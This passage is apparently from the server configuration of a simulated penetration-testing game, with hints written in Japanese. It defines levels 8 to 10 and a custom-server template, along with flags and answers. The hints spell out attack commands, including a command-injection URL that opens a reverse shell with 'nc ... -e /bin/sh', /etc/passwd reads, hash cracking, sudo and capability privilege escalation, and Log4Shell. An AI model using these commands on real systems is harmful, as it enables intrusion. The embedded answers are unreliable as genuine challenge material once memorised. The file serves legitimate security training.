    siteBrand: {
      title: 'Diag-08 拠点ネットワーク監視',
      subtitle: '全国物流センター 死活監視 & 疎通診断コンソール',
    },
    name: 'Lv.8 CmdInj & Baron Samedit',
    hostname: 'diag-08',
    ip: '10.10.1.80',
    os: 'Ubuntu 20.04.1 LTS',
    kernel: 'Linux 5.4.0-42-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:08',
    summary: 'Web診断ツールのOSコマンドインジェクションから侵入し、ハッシュクラックとsudo CVE-2021-3156(Baron Samedit)で完全制圧する上級ターゲット。',
    objective: 'コマンドインジェクションまたはリバースシェルで侵入し、shadow/バックアップハッシュを解読後にCVE-2021-3156でroot化してください。',
    toolsUsed: ['nmap', 'curl', 'nc', 'john', 'su', 'searchsploit', 'exploit'],
    hints: [
      'ポート80の `/diag?host=127.0.0.1` にOSコマンドインジェクション (`; id` や `; cat /etc/passwd`) があります。',
      '`curl "http://10.10.1.80/diag?host=127.0.0.1; nc 10.10.0.5 4444 -e /bin/sh"` (または `exploit cmdinj 10.10.1.80`) で `www-data` シェルを取得できます。',
      'シェル内で `/var/backups/shadow.bak` のハッシュを `john` でクラック (`cyberlab`) して `su ops` → `sudo --version` (1.8.31) を確認後 `exploit CVE-2021-3156` でrootを取得！',
    ],
    flag: 'FLAG{lvl8_cmdinj_shadow_crack_baron_samedit}',
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 6,
      requireStealthOrTargeted: true,
    },
    services: [
      {
        id: 's8-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.1',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1',
        vulnerabilities: [],
      },
      {
        id: 's8-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'nginx 1.18.0 (Ubuntu)',
        state: 'open',
        banner: 'nginx/1.18.0',
        vulnerabilities: ['http_cmd_inj'],
        shellUser: 'www-data',
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>Network Diagnostics</title></head><body><h1>Diag-08 Ping Utility</h1><p>GET /diag?host=127.0.0.1</p></body></html>`,
          },
          {
            path: '/diag',
            status: 200,
            contentType: 'text/plain',
            body: `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.042 ms\n`,
            cmdInjEnabled: true,
          },
        ],
      },
    ],
    users: [
      {
        username: 'www-data',
        uid: 33,
        gid: 33,
        home: '/var/www',
        shell: '/usr/sbin/nologin',
      },
      {
        username: 'ops',
        uid: 1001,
        gid: 1001,
        home: '/home/ops',
        shell: '/bin/bash',
        password: 'cyberlab',
        passwordHash: '$6$diag88$9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b',
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/var/www', content: '', owner: 'www-data', group: 'www-data', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/var/backups/shadow.bak',
        content: `root:*:19000:0:99999:7:::\nops:$6$diag88$9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b:19000:0:99999:7:::\n`,
        owner: 'root',
        group: 'www-data',
        permissions: '-rw-r-----',
      },
      { path: '/home/ops', content: '', owner: 'ops', group: 'ops', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/ops/sudo_notice.txt',
        content: 'URGENT: Update sudo 1.8.31 immediately (vulnerable to CVE-2021-3156 Baron Samedit).\n',
        owner: 'ops',
        group: 'ops',
        permissions: '-rw-r--r--',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{lvl8_cmdinj_shadow_crack_baron_samedit}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      sudoCve20213156: true,
    },
  },

  // =========================================================================
  // LEVEL 9: Multi-Hop Pivot / Bastion Network (Security Level 9/10)
  // =========================================================================
  {
    id: 'lvl-9',
    level: 9,
    siteTemplate: 'bastion',
    siteBrand: {
      title: 'Bastion-09 DMZゲートウェイ',
      subtitle: '拠点間ゼロトラスト中継ノード',
    },
    name: 'Lv.9 DMZ Bastion & Internal Pivot',
    hostname: 'bastion-09',
    ip: '10.10.2.10',
    os: 'Debian GNU/Linux 12 (bookworm)',
    kernel: 'Linux 6.1.0-17-amd64 x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:09',
    summary: 'DMZ踏み台サーバーを侵害し、内部ネットワーク(172.16.0.0/24)へピボットして隔離されたVaultサーバーからフラグを奪う多段攻撃ミッション。',
    objective: 'bastion-09 (10.10.2.10) を突破し、内部ネットワークの 172.16.0.50 を発見・ピボットしてフラグを奪取してください。',
    toolsUsed: ['nmap', 'curl', 'ssh', 'ip', 'arp-scan', 'redis-cli'],
    hints: [
      'まずは `nmap -sS -T2 -p 22,8080 10.10.2.10` でDMZサーバーを調査。ポート8080の `/api/config` にSSH秘密鍵またはヒントがあります。',
      '`ssh -i ... pivot@10.10.2.10` でログイン後、`ip a` や `arp-scan 172.16.0.0/24` を実行すると内部ホスト `172.16.0.50` が見つかります。',
      '踏み台シェル内から `nmap -sV 172.16.0.50` → `redis-cli -h 172.16.0.50` または `curl http://172.16.0.50:8000/vault/flag` でフラグを取得してください！',
    ],
    flag: 'FLAG{lvl9_dmz_bastion_internal_pivot_master}',
    internalNetwork: {
      subnet: '172.16.0.0/24',
      gateway: '172.16.0.1',
      targetServerId: 'lvl-9-internal',
    },
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 5,
      requireStealthOrTargeted: true,
      decoyFilteredPorts: [21, 25, 3306],
    },
    services: [
      {
        id: 's9-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 9.2p1 Debian 2',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_9.2p1 Debian-2',
        vulnerabilities: ['ssh_key_auth'],
      },
      {
        id: 's9-http',
        port: 8080,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'Go net/http (Bastion API)',
        state: 'open',
        banner: 'Bastion-Gateway/2.0',
        vulnerabilities: ['http_env_leak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'application/json',
            body: `{"gateway":"bastion-09","status":"restricted","routes":["/health","/api/config"]}`,
          },
          {
            path: '/health',
            status: 200,
            contentType: 'application/json',
            body: `{"status":"healthy"}`,
          },
          {
            path: '/api/config',
            status: 200,
            contentType: 'application/json',
            body: `{"user":"pivot","internal_subnet":"172.16.0.0/24","ssh_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\\nPIVOT_BASTION_KEY_09\\n-----END OPENSSH PRIVATE KEY-----"}`,
          },
        ],
      },
    ],
    users: [
      {
        username: 'pivot',
        uid: 1000,
        gid: 1000,
        home: '/home/pivot',
        shell: '/bin/bash',
        sshAuthorizedKeys: ['PIVOT_BASTION_KEY_09'],
      },
    ],
    files: [
      { path: '/home/pivot', content: '', owner: 'pivot', group: 'pivot', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/pivot/network_map.txt',
        content: `DMZ Gateway: 10.10.2.10\nInternal Interface eth1: 172.16.0.10/24\nTarget Vault: 172.16.0.50 (Unreachable from external WAN; access from bastion-09 only)\n`,
        owner: 'pivot',
        group: 'pivot',
        permissions: '-rw-r--r--',
      },
    ],
    privescVectors: {},
  },

  // Internal Pivot Target for Level 9 (reachable when inside lvl-9)
  {
    id: 'lvl-9-internal',
    level: 9,
    name: 'Lv.9 Internal Vault (172.16.0.50)',
    hostname: 'vault-internal',
    ip: '172.16.0.50',
    os: 'Alpine Linux 3.19',
    kernel: 'Linux 6.6.14-0-lts x86_64',
    ttl: 64,
    macAddress: '00:50:56:AC:16:50',
    summary: 'DMZ踏み台サーバーの背後にある内部Vaultサーバー。',
    objective: 'bastion-09からピボットしてこの内部サーバーのフラグを取得してください。',
    toolsUsed: ['nmap', 'redis-cli', 'curl'],
    hints: [
      'Redis (6379) と内部API (8000) が開放されています。',
      '`redis-cli -h 172.16.0.50` で `GET vault:flag` または `curl http://172.16.0.50:8000/vault/flag -H "X-Internal-Gateway: bastion-09"` を試してください。',
    ],
    flag: 'FLAG{lvl9_dmz_bastion_internal_pivot_master}',
    requiresPivotFrom: 'lvl-9',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's9i-redis',
        port: 6379,
        protocol: 'tcp',
        type: 'redis',
        name: 'redis',
        version: 'Redis 7.0.11',
        state: 'open',
        banner: '+PONG',
        vulnerabilities: ['redis_unauth'],
        redisKeys: {
          'vault:flag': 'FLAG{lvl9_dmz_bastion_internal_pivot_master}',
          'vault:status': 'sealed_internal_only',
        },
      },
      {
        id: 's9i-http',
        port: 8000,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'Python/3.11 aiohttp',
        state: 'open',
        banner: 'Python/3.11 aiohttp/3.8',
        vulnerabilities: [],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'application/json',
            body: `{"vault":"172.16.0.50","endpoint":"/vault/flag"}`,
          },
          {
            path: '/vault/flag',
            status: 200,
            contentType: 'application/json',
            body: `{"flag":"FLAG{lvl9_dmz_bastion_internal_pivot_master}"}`,
          },
        ],
      },
    ],
    users: [
      { username: 'root', uid: 0, gid: 0, home: '/root', shell: '/bin/sh' },
    ],
    files: [
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      { path: '/root/flag.txt', content: 'FLAG{lvl9_dmz_bastion_internal_pivot_master}\n', owner: 'root', group: 'root', permissions: '-rw-------' },
    ],
    privescVectors: {},
  },

  // =========================================================================
  // LEVEL 10: Sovereign Zero-Trust Core (Security Level 10/10)
  // =========================================================================
  {
    id: 'lvl-10',
    level: 10,
    siteTemplate: 'gov',
    siteBrand: {
      title: 'Sovereign Zero-Trust Core',
      subtitle: '統合ガバナンス & セキュア認証ノード',
    },
    name: 'Lv.10 Sovereign Zero-Trust Core',
    hostname: 'sovereign-10',
    ip: '10.10.10.10',
    os: 'Hardened Debian 12 (Zero-Trust Kernel)',
    kernel: 'Linux 6.1.0-18-hardened x86_64',
    ttl: 64,
    macAddress: '00:50:56:FF:10:10',
    summary: '最終防衛ライン。ポートノッキング・厳格IDS・Base64暗号ヒント・Log4Shell/SSTI・Linux Capabilities(cap_setuid)による特権昇格を組み合わせた最高難度サーバー。',
    objective: 'DNSのノック順序解読 → Port Knocking → Log4Shell/SSTI侵入 → Base64復号 & cap_setuid特権昇格で /root/.vault/flag.txt を奪取せよ。',
    toolsUsed: ['dig', 'nc', 'nmap', 'searchsploit', 'exploit', 'base64', 'getcap'],
    hints: [
      '通常のポートスキャンでは9000番ポートが閉じて見えます。まず `dig @10.10.10.10 TXT knock.sovereign.lab` でBase64エンコードされたノック順序と隠し情報を確認し、`echo "..." | base64 -d` で復号しましょう。',
      'ポートノッキング (`nc -z 10.10.10.10 7001`, `8002`, `9003` を順番に実行) でポート9000 (Log4j 2.14.1 / SSTI) が開放されます。`nmap -sS -T2 -p 22,53,9000 10.10.10.10` で確認後、`exploit CVE-2021-44228 10.10.10.10 9000` で侵入してください。',
      '侵入後 `getcap -r / 2>/dev/null` を実行すると `/usr/bin/python3.11 = cap_setuid+ep` が見つかります。`python3.11 -c "import os; os.setuid(0)"` でrootになり `/root/.vault/flag.txt` を読んでください！',
    ],
    flag: 'FLAG{lvl10_zero_trust_knock_log4shell_cap_setuid}',
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 4,
      requireStealthOrTargeted: true,
      decoyFilteredPorts: [21, 80, 443, 3306, 8080],
      knockPorts: [7001, 8002, 9003],
    },
    services: [
      {
        id: 's10-dns',
        port: 53,
        protocol: 'tcp',
        type: 'dns',
        name: 'domain',
        version: 'ISC BIND 9.18.24',
        state: 'open',
        banner: 'BIND 9.18.24 Hardened',
        vulnerabilities: ['dns_txt_secret'],
        dnsZoneTransfer: false,
        dnsRecords: [
          { type: 'A', name: 'sovereign.lab', value: '10.10.10.10' },
          {
            type: 'TXT',
            name: 'knock.sovereign.lab',
            // Base64 of: "KNOCK_SEQ=7001,8002,9003 | TARGET_PORT=9000"
            value: 'S05PQ0tfU0VRPTcwMDEsODAwMiw5MDAzIHwgVEFSR0VUX1BPUlQ9OTAwMA==',
          },
        ],
      },
      {
        id: 's10-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 9.6p1 Hardened',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_9.6p1',
        vulnerabilities: [],
      },
      {
        id: 's10-app',
        port: 9000,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'Java SpringBoot / Log4j 2.14.1',
        state: 'filtered', // Unlocks to 'open' after knockSequence!
        banner: 'Sovereign-Core/10.0',
        knockSequence: [7001, 8002, 9003],
        vulnerabilities: ['http_log4j_rce', 'http_ssti'],
        shellUser: 'appuser',
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'application/json',
            body: `{"core":"Sovereign-10","security":"Zero-Trust","logging":"Log4j 2.14.1","template":"?name=guest"}`,
            sstiEnabled: true,
          },
        ],
      },
    ],
    users: [
      {
        username: 'appuser',
        uid: 1005,
        gid: 1005,
        home: '/home/appuser',
        shell: '/bin/bash',
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/appuser', content: '', owner: 'appuser', group: 'appuser', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/appuser/audit_hint.txt',
        content: 'Note: Check Linux capabilities (getcap -r / 2>/dev/null) on python binaries.\n',
        owner: 'appuser',
        group: 'appuser',
        permissions: '-rw-r--r--',
      },
      {
        path: '/usr/bin/python3.11',
        content: '[ELF 64-bit hardened binary]',
        owner: 'root',
        group: 'root',
        permissions: '-rwxr-xr-x',
        execHint: 'cap_setuid+ep enabled! Run: python3.11 -c "import os; os.setuid(0)"',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      { path: '/root/.vault', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/.vault/flag.txt',
        content: 'FLAG{lvl10_zero_trust_knock_log4shell_cap_setuid}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      capabilities: [
        {
          binary: '/usr/bin/python3.11',
          cap: 'cap_setuid+ep',
          exploitCmd: 'python3.11 -c "import os; os.setuid(0)"',
        },
      ],
    },
  },
];

export const CAMPAIGN_SERVERS: ServerConfig[] = [
  ...BASE_CAMPAIGN_SERVERS,
  ...EXTRA_CAMPAIGN_SERVERS,
  ...BATCH2_CAMPAIGN_SERVERS,
  ...BATCH3_CAMPAIGN_SERVERS,
].sort((a, b) => a.level - b.level);

export const SECURITY_LEVEL_DESCRIPTIONS: Record<SecurityLevel, { label: string; summary: string }> = {
  1: { label: 'Lv.1 無防備 (Exposed)', summary: '匿名FTPや設定ミスによる公開ディレクトリ。初期偵察の基礎。' },
  2: { label: 'Lv.2 情報漏洩 (Leakage)', summary: 'robots.txt・.env漏洩・脆弱パスワードによるSSH侵害。' },
  3: { label: 'Lv.3 Web/DB複合 (Injection)', summary: 'SQLインジェクション、LFI、MySQL弱認証の多面攻撃。' },
  4: { label: 'Lv.4 既知バックドア (Legacy)', summary: '既知CVEバックドアとSUIDバイナリによるroot権限昇格。' },
  5: { label: 'Lv.5 設定不備連鎖 (Misconfig)', summary: 'パストラバーサル/.git漏洩とsudo設定不備の悪用。' },
  6: { label: 'Lv.6 IDS/FW回避 (Evasion)', summary: 'ステルススキャン必須。SSRF/Redis未認証とcron改ざん。' },
  7: { label: 'Lv.7 認証回避 (Protocol)', summary: 'DNSゾーン転送(AXFR)とJWT署名脆弱性の連鎖。' },
  8: { label: 'Lv.8 RCE & クラック (Exploit)', summary: 'OSコマンドインジェクション・ハッシュ解読・Baron Samedit。' },
  9: { label: 'Lv.9 多段ピボット (Lateral)', summary: 'DMZ踏み台から内部ネットワークへの横展開攻撃。' },
  10: { label: 'Lv.10 Zero-Trust (Master)', summary: 'ポートノッキング・厳格IDS・Log4Shell・Capabilities制圧。' },
};

export function createCustomServerTemplate(level: SecurityLevel, customIndex: number): ServerConfig {
  const ipLastOctet = 100 + customIndex;
  const isHardened = level >= 6;
  const hasPrivesc = level >= 4;
  const flagSlug = `custom_lvl${level}_${Math.random().toString(36).slice(2, 8)}`;

  return {
    id: `custom-${Date.now()}`,
    level,
    isCustom: true,
    name: `Custom Server Lv.${level} #${customIndex}`,
    hostname: `custom-node-${customIndex}`,
    ip: `10.10.50.${ipLastOctet}`,
    os: level >= 8 ? 'Hardened Debian 12' : 'Ubuntu 22.04 LTS',
    kernel: 'Linux 6.1.0-generic x86_64',
    ttl: 64,
    macAddress: `00:50:56:C0:${String(level).padStart(2, '0')}:${String(ipLastOctet).slice(-2)}`,
    summary: `ユーザー作成のセキュリティレベル ${level}/10 カスタムサーバー。`,
    objective: `自作サーバー (10.10.50.${ipLastOctet}) の脆弱性を突き、フラグを奪取してください。`,
    toolsUsed: isHardened ? ['nmap', 'curl', 'ssh', 'exploit'] : ['nmap', 'curl', 'ftp', 'ssh'],
    hints: [
      isHardened
        ? `Security Lv.${level} ではステルススキャン (-sS -T2) でポートを調査しましょう。`
        : `まずは nmap -sV 10.10.50.${ipLastOctet} でポートをスキャンしてください。`,
      hasPrivesc
        ? '初期アクセス後に sudo -l や find / -perm -4000 で権限昇格経路を確認してください。'
        : '公開されたWebパスやFTP・DBサービスからフラグを探してください。',
    ],
    flag: `FLAG{${flagSlug}}`,
    firewall: {
      idsEnabled: isHardened,
      blockAggressiveScans: isHardened,
      rateLimitThreshold: Math.max(4, 12 - level),
      requireStealthOrTargeted: level >= 7,
      decoyFilteredPorts: level >= 8 ? [23, 445, 3389] : [],
      knockPorts: level === 10 ? [7001, 8002, 9003] : undefined,
    },
    services: [
      {
        id: `cs-ssh-${Date.now()}`,
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.9p1 Ubuntu',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.9p1',
        vulnerabilities: level <= 4 ? ['ssh_weak_password', 'ssh_key_auth'] : ['ssh_key_auth'],
      },
      {
        id: `cs-http-${Date.now() + 1}`,
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: level === 5 ? 'Apache httpd 2.4.49' : 'nginx 1.24.0',
        state: 'open',
        banner: level === 5 ? 'Apache/2.4.49' : 'nginx/1.24.0',
        vulnerabilities:
          level <= 2
            ? ['http_robots_leak', 'http_env_leak']
            : level <= 5
            ? ['http_sqli', 'http_lfi']
            : ['http_cmd_inj'],
        shellUser: 'operator',
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>Custom Node</title></head><body><h1>Custom Server Lv.${level}</h1><p>Configured via Server Builder.</p></body></html>`,
          },
          {
            path: '/robots.txt',
            status: 200,
            contentType: 'text/plain',
            body: `User-agent: *\nDisallow: /secret/\nDisallow: /.env\n`,
          },
          {
            path: '/.env',
            status: 200,
            contentType: 'text/plain',
            body: `SSH_USER=operator\nSSH_PASS=cyberlab\n`,
          },
          ...(level >= 6
            ? [
                {
                  path: '/diag',
                  status: 200,
                  contentType: 'text/plain' as const,
                  body: `PING 127.0.0.1: icmp_seq=1 ttl=64 time=0.05 ms`,
                  cmdInjEnabled: true,
                },
              ]
            : []),
        ],
      },
    ],
    users: [
      {
        username: 'operator',
        uid: 1000,
        gid: 1000,
        home: '/home/operator',
        shell: '/bin/bash',
        password: 'cyberlab',
        sudoRules: hasPrivesc ? ['(ALL) NOPASSWD: /usr/bin/find'] : [],
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/operator', content: '', owner: 'operator', group: 'operator', permissions: 'drwxr-xr-x', isDirectory: true },
      ...(!hasPrivesc
        ? [
            {
              path: '/home/operator/flag.txt',
              content: `FLAG{${flagSlug}}\n`,
              owner: 'operator',
              group: 'operator',
              permissions: '-rw-r--r--',
            },
          ]
        : [
            {
              path: '/home/operator/note.txt',
              content: 'Try sudo -l to check privilege escalation.\n',
              owner: 'operator',
              group: 'operator',
              permissions: '-rw-r--r--',
            },
          ]),
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: `FLAG{${flagSlug}}\n`,
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: hasPrivesc
      ? {
          sudoAbuse: [
            {
              binary: '/usr/bin/find',
              exploitCmd: 'sudo find . -exec /bin/sh \\;',
            },
          ],
        }
      : {},
    createdAt: Date.now(),
  };
}
